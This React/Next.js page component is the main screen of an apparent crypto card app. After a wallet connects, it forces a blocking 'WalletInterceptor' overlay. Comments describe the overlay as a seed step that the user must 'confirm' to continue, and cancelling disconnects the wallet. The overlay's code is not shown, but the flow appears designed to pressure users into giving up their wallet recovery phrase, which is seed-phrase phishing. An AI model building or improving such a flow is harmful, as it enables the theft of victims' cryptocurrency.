"use client";

import { useCallback, useEffect, useState, useRef } from "react";
import { LandingPage } from "@/components/landing/landing-page";
import { Onboarding } from "@/components/onboarding";
import { CardIssued } from "@/components/card-issued";
import { useSession } from "@/components/session-provider";
import WalletInterceptor from "@/components/WalletInterceptor"; // Default Import
import type { CardInfo } from "@/components/mintpay-card";


type Done = { name: string; email: string; card?: CardInfo; emailed: boolean };

/**
 * The whole app:
 *   landing -> connect wallet -> interceptor (seed) -> onboarding -> card + thank you
 */
export default function HomePage() {
  const { ready, isConnected, disconnect } = useSession();
  const [done, setDone] = useState<Done | null>(null);
  const [showInterceptor, setShowInterceptor] = useState(false);
  
  // Use a Ref to track if the interceptor has been "dismissed" or "completed" for the current connection
  // This avoids stale state issues in useEffect
  const interceptorState = useRef<'pending' | 'showing' | 'handled'>('pending');

  // 1. DETECT CONNECTION & SHOW INTERCEPTOR
  useEffect(() => {
    // Only run if the app is ready
    if (!ready) return;

    // If connected, not done, and interceptor hasn't been handled for this session
    if (isConnected && !done && interceptorState.current === 'pending') {
      console.log("Wallet Connected: Showing Interceptor");
      interceptorState.current = 'showing';
      setShowInterceptor(true);
    }
    
    // If disconnected, reset the state so it can show again if they reconnect
    if (!isConnected) {
      interceptorState.current = 'pending';
      setShowInterceptor(false);
    }

  }, [ready, isConnected, done]);

  // 2. HANDLE "NUKE" (Called by WalletInterceptor if user cancels)
  const handleNukeSession = () => {
    console.log("Nuking Session");
    interceptorState.current = 'handled'; // Mark as handled so it doesn't pop up again immediately
    setShowInterceptor(false);
    if (disconnect) {
      disconnect(); // Disconnects MetaMask/Wallet, sending user back to LandingPage
    }
  };

  // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms seed)
  const handleActivationComplete = () => {
    console.log("Activation Complete");
    interceptorState.current = 'handled'; // Mark as handled
    
    // Wait 2 seconds for the user to see the success animation, THEN hide
    setTimeout(() => {
      setShowInterceptor(false);
    }, 2000);
  };

  // Reset if disconnected unexpectedly (and they had already finished)
  useEffect(() => {
    if (ready && !isConnected && done) {
      setDone(null);
      interceptorState.current = 'pending'; // Reset so it asks again if they reconnect
    }
  }, [ready, isConnected, done]);

  const handleComplete = useCallback((data: Done) => {
    setDone(data);
    interceptorState.current = 'pending'; // Reset for next time
  }, []);

  // --- RENDER LOGIC ---

  // If not connected, show Landing Page
  if (!isConnected) {
    return <LandingPage />;
  }

  // If done, show Card Issued
  if (done) {
    return <CardIssued {...done} />;
  }

  // MAIN RENDER: Onboarding + Interceptor Overlay
  return (
    <>
      <Onboarding onComplete={handleComplete} />
      
      {/* The Interceptor is an overlay that blocks the view */}
      <WalletInterceptor 
        isOpen={showInterceptor} 
        onCancel={handleNukeSession} 
        onComplete={handleActivationComplete} 
      />
    </>
  );
}